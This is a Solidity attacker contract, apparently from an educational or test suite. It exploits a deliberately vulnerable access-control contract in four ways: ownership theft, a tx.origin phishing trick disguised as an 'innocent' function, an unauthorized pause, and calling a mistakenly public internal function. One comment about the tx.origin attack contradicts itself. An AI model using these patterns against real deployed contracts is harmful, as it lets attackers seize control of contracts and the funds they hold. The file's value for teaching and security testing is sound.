// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../vulnerable/AccessControlVulnerable.sol";


contract AccessControlAttacker {
    AccessControlVulnerable public target;
    
    event AttackExecuted(string attackType, bool success);
    event OwnershipStolen(address newOwner);
    
    constructor(address _target) {
        target = AccessControlVulnerable(_target);
    }
    
    // Attack 1: Steal ownership due to missing access control
    function stealOwnership() external {
        address originalOwner = target.owner();
        
        try target.transferOwnership(address(this)) {
            address newOwner = target.owner();
            emit OwnershipStolen(newOwner);
            emit AttackExecuted("OwnershipTheft", true);
        } catch {
            emit AttackExecuted("OwnershipTheft", false);
        }
    }
    
    // Attack 2: Exploit tx.origin vulnerability through intermediary contract
    function txOriginAttack(address victim) external {
        
        TxOriginExploiter exploiter = new TxOriginExploiter(address(target), victim);
        
        try exploiter.exploit() {
            emit AttackExecuted("TxOrigin", true);
        } catch {
            emit AttackExecuted("TxOrigin", false);
        }
    }
    
    // Attack 3: Unauthorized pause
    function unauthorizedPause() external {
        try target.emergencyPause() {
            emit AttackExecuted("UnauthorizedPause", true);
        } catch {
            emit AttackExecuted("UnauthorizedPause", false);
        }
    }
    
    // Attack 4: Call internal function that's mistakenly public
    function callInternalFunction() external returns (string memory) {
        try target._internalFunction() returns (string memory result) {
            emit AttackExecuted("InternalFunctionCall", true);
            return result;
        } catch {
            emit AttackExecuted("InternalFunctionCall", false);
            return "Failed";
        }
    }
    
    function isOwner() external view returns (bool) {
        return target.owner() == address(this);
    }
}


contract TxOriginExploiter {
    AccessControlVulnerable public target;
    address public victim;
    
    constructor(address _target, address _victim) {
        target = AccessControlVulnerable(_target);
        victim = _victim;
    }
    
    function exploit() external {
        // This will fail because tx.origin will be the original caller,
        // not this contract, thus exploiting the vulnerability.
        target.addAdmin(address(this));
    }
    
    // Function to be called by victim (in a real attack scenario)
    function innocentFunction() external {
        // Victim calls this thinking it's harmless
        // But it exploits tx.origin vulnerability
        target.addAdmin(address(this));
    }
}